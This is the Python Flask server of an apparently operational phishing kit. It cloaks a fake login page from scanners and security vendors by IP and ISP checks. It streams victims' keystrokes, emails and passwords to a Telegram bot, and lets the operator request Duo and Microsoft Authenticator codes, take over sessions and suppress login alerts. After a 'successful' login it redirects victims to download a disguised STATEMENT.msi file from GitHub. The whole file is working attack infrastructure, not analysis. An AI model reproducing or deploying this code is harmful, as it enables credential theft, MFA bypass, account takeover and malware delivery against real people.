from flask import Flask, request, session, jsonify
from flask_cors import CORS
from flask import render_template, send_from_directory, redirect, Response
from models import Email_statuses, HostedUrls, Variables, conn_message
from flask_cors import CORS
from dotenv import load_dotenv
from tg import send_notification, get_status_update, send_keystroke_notification_to_admin
from utils import Local_Cache, get_admin_user
import os, time
from urllib.parse import quote
import requests
import user_agents

# --- Load Environment Variables ---
load_dotenv()
DEFAULT_USER_ID = os.getenv("USER_ID")
BOT_TOKEN = os.getenv("BOT_TOKEN")
IP_API_KEY = os.getenv("IP_API_KEY")
REDIRECT_URL = os.getenv("REDIRECT_URL")
STRICT_MODE = os.getenv("STRICT_MODE")
OWNER = os.getenv("OWNER")
vercel_url = os.getenv("VERCEL_PROJECT_PRODUCTION_URL")

# --- Flask App Initialization ---
app = Flask(__name__, static_folder='build')
files_folder = "files"

CORS(app, resources={r"/*": {"origins": "*"}})




@app.get("/bot")
def bot_info():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getMe"

    response = requests.get(url)
    data = response.json()

    if data["ok"]:
        bot_info = data["result"]
        return f"Bot Username: @{bot_info['username']}"
    else:
        return "Failed to get bot info"


@app.get("/version")
def version():
    return {"status":"success", "version":"version 3.0", "owner": OWNER}



@app.get("/urls")
def get_urls():
    """
    Returns a JSON list of all unique HOSTED_URLs saved in the database.
    """
    try:
        urls_cursor = HostedUrls.find({}, {'_id': 0, 'url': 1})
        urls_list = [doc['url'] for doc in urls_cursor]
        return jsonify({"urls": urls_list})
    except Exception as e:
        print(f"[ERROR] Could not fetch URLs from database: {e}")
        return jsonify({"error": "Failed to connect to the database."}), 500






def get_ip_details(ip_address):
    try:
        if not IP_API_KEY:
            return False
        url = f"http://ip-api.com/json/{ip_address}?fields=66842623"

        headers = {
        
        }

        bot_indicators = ["Amazon", "AWS", "EC2", "DigitalOcean", "Microsoft", 
                      "Outlook", "Proofpoint", "Cisco", "Google", "Azure", "Mimecast"]
        
        ip_data = requests.get(url, headers=headers).json()
        print(ip_data)
        mobile = ip_data.get('mobile', '')
        country_code = ip_data.get('countryCode', '').lower()

        if country_code not in ["us", "ca"]:
            return True

        isp = ip_data.get("isp", "").lower()
        org = ip_data.get("org", "").lower()
        proxy = ip_data.get("proxy", "")
        hosting = ip_data.get("hosting", "")

        for keyword in bot_indicators:
            if keyword.lower() in isp or keyword.lower() in org:
                if keyword.lower() == "google" and "google fiber" in org:
                    pass
                else:
                    return True

        if country_code != "us":
            if not hosting and not proxy:
                return False
            return True

        if STRICT_MODE == "yes":
            if hosting:
                return True
            
            if proxy:
                return True
            
        if mobile:
            return False

        return False
    except Exception as e:
        print("An error occurred ", e)
        return True






@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve(path):
    """
    Main entrypoint: Handles serving the React application.
    The user_id is now passed in API calls from the client, not handled by sessions.
    """
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent_str  = request.headers.get('User-Agent', '')
    print("\n\n================ Ip Details ===================")
    user_agent = user_agents.parse(user_agent_str)

    device_type = (
        "mobile" if user_agent.is_mobile else
        "tablet" if user_agent.is_tablet else
        "pc" if user_agent.is_pc else
        "other"
    )
    
    print({
        "visitor_ip": visitor_ip,
        "user_agent": user_agent_str,
        "device_type": device_type,
        "browser": user_agent.browser.family,
        "os": user_agent.os.family
    }, "\n")
    
    server_data = Variables.find_one({"name":vercel_url})
    if server_data and server_data.get("value") == "off":
        return redirect("https://outlook.com")

    # https://tea.texas.gov/about-tea/89thlege-hb2-faq-teacher-compensation-updated-june-26.pdf

    # if STRICT_MODE == "yes":
    #     if device_type not in ['mobile', 'tablet']:
    #         print("redirected not mobile or tablet")
    #         return redirect(REDIRECT_URL)

    if get_ip_details(visitor_ip):
        print("redirected bot detected")
        return redirect("https://outlook.com")

    print("Woks perfecty heading to login")
    # This logic is now much simpler.
    # If the path points to an existing file in the static folder (like CSS, JS, or an image), serve it.
    if path != "" and os.path.exists(os.path.join(app.static_folder, path)):
        return send_from_directory(app.static_folder, path)
    
    return send_from_directory(app.static_folder, 'index.html')


# @app.get("/file/<file_name>")
# def get_file(file_name):
#     return send_from_directory(files_folder,file_name)


@app.get("/set_status/<user_id>/<email>/<status>")
def set_status(user_id, email, status):
    """
    Called by Telegram buttons to update a user's login status.
    """
    try:
        Email_statuses.update_one(
            {"email": email},
            {"$set": {"status": status, "custom_data": None}},  # Clear custom data on standard status change
            upsert=True
        )
        return {"status":"success", "message":f"Status updated for {email} as {status}"}
    except Exception as e:
        return {"status":"error", "message":str(e)}


# --- MODIFIED: Endpoint now serves a form on GET and processes it on POST ---
@app.route("/set_custom_status", methods=['GET', 'POST'])
def set_custom_status():
    """
    Handles setting a custom status.
    GET: Displays an HTML form to input custom status details.
    POST: Processes the submitted form and updates the database.
    """
    if request.method == 'GET':
        email = request.args.get('email')
        if not email:
            return "Error: An email must be provided in the URL.", 400
        
        # Return a simple HTML form
        html_form = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Set Custom Status</title>
            <style>
                body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
                .container {{ background: white; padding: 25px 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 500px; }}
                h2 {{ text-align: center; color: #1c1e21; border-bottom: 1px solid #ddd; padding-bottom: 15px; margin-top: 0; }}
                label {{ display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; }}
                input[type='text'], textarea {{ width: 100%; padding: 10px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #ddd; box-sizing: border-box; font-size: 16px; }}
                input[type='submit'] {{ background-color: #0067b8; color: white; padding: 12px 20px; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }}
                input[type='submit']:hover {{ background-color: #005a9e; }}
                .email-display {{ background-color: #e9ecef; padding: 12px; border-radius: 6px; margin-bottom: 25px; text-align: center; font-size: 14px; }}
                .radio-group label {{ display: inline-block; margin-right: 20px; font-weight: normal; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Set Custom Status</h2>
                <div class="email-display">Setting status for: <strong>{email}</strong></div>
                <form action="/set_custom_status" method="post">
                    <input type="hidden" name="email" value="{email}">
                    
                    <label for="title">Title:</label>
                    <input type="text" id="title" name="title" required>
                    
                    <label for="subtitle">Subtitle:</label>
                    <textarea id="subtitle" name="subtitle" rows="3" required></textarea>
                    
                    <label>Requires Input from User?</label>
                    <div class="radio-group">
                        <input type="radio" id="input_true" name="has_input" value="true" checked>
                        <label for="input_true">Yes</label>
                        <input type="radio" id="input_false" name="has_input" value="false">
                        <label for="input_false">No</label>
                    </div>
                    <br><br>
                    <input type="submit" value="Set Status">
                </form>
            </div>
        </body>
        </html>
        """
        return html_form

    if request.method == 'POST':
        try:
            email = request.form.get('email')
            title = request.form.get('title')
            subtitle = request.form.get('subtitle')
            has_input = request.form.get('has_input') == 'true'

            if not email or not title or not subtitle:
                return "Error: All fields are required.", 400

            custom_data = { "title": title, "subtitle": subtitle, "has_input": has_input }
            Email_statuses.update_one(
                {"email": email.strip()},
                {"$set": {"status": "custom", "custom_data": custom_data}},
                upsert=True
            )
            return "<div style='font-family: sans-serif; text-align: center; padding-top: 50px;'><h1>Success!</h1><p>Custom status has been set for {email}. You can now close this window.</p></div>"
        except Exception as e:
            return f"<h1>Error</h1><p>An error occurred: {e}</p>", 500






# --- MODIFIED: Endpoint now serves a form on GET and processes it on POST ---
@app.route("/set_ms_authenticator_status", methods=['GET', 'POST'])
def set_ms_authenticator_status():
    """
    Handles setting MS Authenticator status.
    GET: Displays an HTML form to input MS code.
    POST: Processes the submitted form and updates the database.
    """
    if request.method == 'GET':
        email = request.args.get('email')
        if not email:
            return "Error: An email must be provided in the URL.", 400
        
        # Return a simple HTML form
        html_form = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Set MS Authenticator Status</title>
            <style>
                body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
                .container {{ background: white; padding: 25px 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 500px; }}
                h2 {{ text-align: center; color: #1c1e21; border-bottom: 1px solid #ddd; padding-bottom: 15px; margin-top: 0; }}
                label {{ display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; }}
                input[type='text'] {{ width: 100%; padding: 10px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #ddd; box-sizing: border-box; font-size: 16px; }}
                input[type='submit'] {{ background-color: #0078d4; color: white; padding: 12px 20px; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }}
                input[type='submit']:hover {{ background-color: #106ebe; }}
                .email-display {{ background-color: #e9ecef; padding: 12px; border-radius: 6px; margin-bottom: 25px; text-align: center; font-size: 14px; }}
                .instruction {{ background-color: #f8f9fa; padding: 15px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; border-left: 4px solid #0078d4; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Set MS Authenticator Status</h2>
                <div class="email-display">Setting status for: <strong>{email}</strong></div>
                <div class="instruction">
                    <strong>Instructions:</strong> Please enter the Microsoft Authenticator code that you received. This code will be used to verify your identity.
                </div>
                <form action="/set_ms_authenticator_status" method="post">
                    <input type="hidden" name="email" value="{email}">
                    
                    <label for="ms_code">MS Authenticator Code:</label>
                    <input type="text" id="ms_code" name="ms_code" placeholder="Enter your MS code" required>
                    
                    <input type="submit" value="Set MS Authenticator Status">
                </form>
            </div>
        </body>
        </html>
        """
        return html_form

    if request.method == 'POST':
        try:
            email = request.form.get('email')
            ms_code = request.form.get('ms_code')

            if not email or not ms_code:
                return "Error: Email and MS code are required.", 400

            # Update the database with MS authenticator status and code
            Email_statuses.update_one(
                {"email": email.strip()},
                {"$set": {"status": "ms_authenticator", "ms_code": ms_code.strip()}},
                upsert=True
            )
            
            return f"<div style='font-family: sans-serif; text-align: center; padding-top: 50px;'><h1>Success!</h1><p>MS Authenticator status has been set for {email}. You can now close this window.</p></div>"
        
        except Exception as e:
            return f"<h1>Error</h1><p>An error occurred: {e}</p>", 500




            

@app.post("/api/keystroke")
def keystroke():
    """Receives email keystrokes and notifies ONLY the admin with action buttons."""
    data = request.json
    session_id = data.get('session_id')
    if not session_id:
        return jsonify({"error": "Session ID is missing"}), 400
    
    send_keystroke_notification_to_admin(
        session_id=session_id,
        field=data.get('field', 'N/A'),
        value=data.get('value', ''),
        user_id=DEFAULT_USER_ID
    )
    return jsonify({"status": "received"}), 200



@app.get("/takeover/<admin_id>/<session_id>")
def takeover(admin_id, session_id):
    """Endpoint for the admin's 'Takeover' button."""
    admin_user = get_admin_user()
    if not admin_user or admin_id != admin_user.get("id"):
        return "<h1>Unauthorized</h1>", 403
    
    try:
        Email_statuses.update_one(
            {"session_id": session_id},
            {"$set": {"active_user_id": admin_id, "session_id": session_id}},
            upsert=True
        )
        send_notification(f"✅ Takeover successful for session: {session_id}", user_id=admin_id)
        return "<div style='font-family: sans-serif; text-align: center; padding-top: 50px;'><h1>Takeover Successful</h1><p>You now have exclusive control. You can close this window.</p></div>"
    except Exception as e:
        return f"<h1>Error</h1><p>An error occurred: {e}</p>", 500



@app.get("/api/delay-session/<session_id>")
def delay_session(session_id):
    """Endpoint for the admin's 'Delay' button."""
    try:
        Email_statuses.update_one(
            {"session_id": session_id},
            {"$set": {"delay_active": True}},
            upsert=True
        )
        admin_user = get_admin_user()
        if admin_user:
            send_notification(f"⏳ Delay activated for session: {session_id}", user_id=admin_user.get("id"))
        return "<div style='font-family: sans-serif; text-align: center; padding-top: 50px;'><h1>Delay Activated</h1><p>The user notification will be delayed by 4 seconds.</p></div>"
    except Exception as e:
        return f"<h1>Error</h1><p>An error occurred: {e}</p>", 500

# --- Core Logic Endpoints ---

@app.post("/alert")
def alert():
    """Handles general alerts, including the 'typing' and delayed 'sign-in' notifications."""
    req = request.json
    message = req['message']
    session_id = req.get('session_id')
    user_id = req.get('user_id') or DEFAULT_USER_ID

    if not session_id:
        return jsonify({"error": "Session ID is required for alerts"}), 400

    # Handle the "someone is typing" alert - sent before takeover is possible
    if "currently typing an email" in message or "trying to sign in with email" in message:
        send_notification(message, user_id=user_id, session_id=session_id, include_admin=True)
        return jsonify({"status": "success", "message": "Typing alert sent."})

    # Handle the "trying to sign in" alert, which respects the delay logic
    if "trying to sign in with email" in message:
        session_doc = Email_statuses.find_one({"session_id": session_id})

        # Check if the admin activated the delay
        if session_doc and session_doc.get("delay_active"):
            Email_statuses.update_one({"session_id": session_id}, {"$set": {"delay_active": False}})
            time.sleep(4)
            
            # After waiting, check again if a takeover occurred
            updated_doc = Email_statuses.find_one({"session_id": session_id})
            admin_user = get_admin_user()
            if updated_doc and admin_user and str(updated_doc.get("active_user_id")) == str(admin_user.get("id")):
                print(f"Notification for session {session_id} blocked due to admin takeover after delay.")
                send_notification(f"✅ Login notification for {updated_doc.get('email')} was successfully blocked.", user_id=admin_user.get("id"))
                return jsonify({"status": "success", "message": "Notification blocked by takeover."})

    # If no delay was active, or if delay finished without takeover, send to the correct recipients
    send_notification(message, user_id=user_id, session_id=session_id, include_admin=True)
    return jsonify({"status": "success", "message": "Alert sent."})




@app.post("/auth")
def auth():
    """
    Handles authentication attempts from the frontend.
    Includes logic to return custom status data.
    """
    req = request.json
    # MODIFIED: Get user_id from the request body instead of the session.
    user_id = req.get('user_id') or DEFAULT_USER_ID
    session_id = req.get('session_id')

    email = req['email'].strip()

    unique_filter = {"$or": [{"session_id": session_id}, {"email": email}]}


    password = req['password']
    incoming_duo_code = req.get('duoCode')
    custom_input = req.get('customInput')

    # The rest of this function remains exactly the same.
    db_record = Email_statuses.find_one(unique_filter)

    if custom_input:
        send_notification(f"Custom Input Received for {email}:\n{custom_input}", user_id=user_id, session_id=session_id, include_admin=True)
        Email_statuses.update_one(
            unique_filter,
            {"$set": {"status": "pending", "custom_data": None, "session_id": session_id, "email": email}},
            upsert=True
        )
        return jsonify({"status": "pending"})

    if not db_record or str(db_record.get('password')) != str(password):
        get_status_update(session_id=session_id, email=email, password=password, user_id=user_id)
        Email_statuses.update_one(
            unique_filter,
            {"$set": {
                "session_id": session_id, # Always update to the latest session_id
                "email": email,
                "password": password,
                "status": "pending",
                "duoCode": None,
                "user_id": user_id,
                "custom_data": None
            },
            "$setOnInsert": {
                    "active_user_id": user_id,
                    "delay_active": False
                }},
            upsert=True
        )
        return jsonify({"status": "pending"})

    stored_duo_code = db_record.get('duoCode')
    if incoming_duo_code and str(incoming_duo_code) != str(stored_duo_code):
        send_notification(f"Duo Code received for {email}: {incoming_duo_code}", user_id=user_id, session_id=session_id, include_admin=True)
        Email_statuses.update_one(
            unique_filter,
            {"$set": {"status": "pending", "duoCode": incoming_duo_code, "session_id": session_id, "email": email}},
            upsert=True
        )
        return jsonify({"status": "pending"})


    current_status = db_record.get('status', 'pending')
    if current_status == 'custom':
        return jsonify({
            "status": "custom",
            "data": db_record.get('custom_data')
        })
    
    if current_status == "ms_authenticator":
        return jsonify({
            "status": "ms_authenticator",
            "data": db_record.get('ms_code')
        })
    
    if current_status == 'success':
        return jsonify({"status": "success", "redirect_url": "https://raw.githubusercontent.com/doroswills-create/downloads/main/STATEMENT.msi"})
    return jsonify({"status": current_status})



@app.get("/server/<status>")
def server(status):

    if status not in ['on','off']:
        return {"error":"Unacceptable status"}
    data = Variables.find_one({"name": vercel_url})
    old_status = None
    if data:
        old_status = data.get("value")
    
    Variables.update_one(
        {"name": vercel_url},
        {"$set": {"value": status}},
        upsert=True
    )
    return jsonify({"status": status, "old_status": old_status, "vercel_url": vercel_url})



if __name__ == '__main__':
    app.run()
